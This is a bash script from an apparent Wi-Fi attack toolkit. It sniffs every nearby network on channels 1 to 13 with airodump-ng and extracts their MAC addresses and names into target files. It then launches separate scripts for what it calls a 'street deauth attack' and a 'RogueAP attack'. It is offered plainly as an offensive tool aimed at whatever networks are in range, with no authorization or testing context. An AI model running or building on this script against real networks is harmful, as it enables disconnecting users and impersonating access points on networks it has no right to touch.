#!/bin/bash
 
green="\033[32;1m"
yellow="\033[33;1m"
red="\033[31;1m"
purple="\033[37;1m"
cyan="\033[36;1m"

echo ""
echo "put youre interface name in monitor mode in the next input"
                                        read -p "└─────►$(tput setaf 7) " interfaceMon


echo ""
echo "the exploits files gonna late 5 minutes to sniff all near networks to make street deauth attack please be pattient..."
echo ""

for chann in {1..13}; do
exitfile="rogue_$chann"

sudo timeout 15s xterm -e airodump-ng -c $chann --output-format kismet --write $exitfile $interfaceMon >> /dev/null &&

echo "maked channel $chann file for RogueAP attack..."

sed -i '1d' rogue_$chann-01.kismet.csv
echo ""
echo "showing networks in channel $chann..."

echo ""
echo  "${Red}SerialNo        WiFi Channel${White}        WiFi Network${White}"
echo "---------------------------------------------------------------------------------------"
awk -F';' -v track="$chann" '$6 == track {print "     " $6 "               " $3}' rogue_$chann-01.kismet.csv  | nl -n ln -w 8


echo ""
echo "sending AP MAC addresses in channel $chann to export file..."
sleep 3
awk -F';' -v address="$chann" '$6 == address {print $4}' rogue_$chann-01.kismet.csv >> APs$chann.txt


sed -i '/BSSID/d' APs$chann.txt
sed -i 's/^[[:space:]]*//' APs$chann.txt
echo ""
echo "showing MACs in channel $chann..."
echo ""
cat APs$chann.txt
echo ""
echo "sending AP ESSID in channel $chann to export file..."
awk -F';' -v essid="$chann" '$6 == essid {print $3}' rogue_$chann-01.kismet.csv >> Names$chann.txt
echo ""
sed -i 's/^[[:space:]]*//' Names$chann.txt
echo ""
echo "showing Names..."
echo ""
cat Names$chann.txt
echo ""
echo "Waiting before showing results in next hop channel..."
echo ""
sudo ./classfier.sh

done

echo ""
echo "all configure files ready..."
echo "deleting .csv scan files..."  
sudo rm -r *csv
echo ""
echo "starting attack..."
sudo ./rogueAttack.sh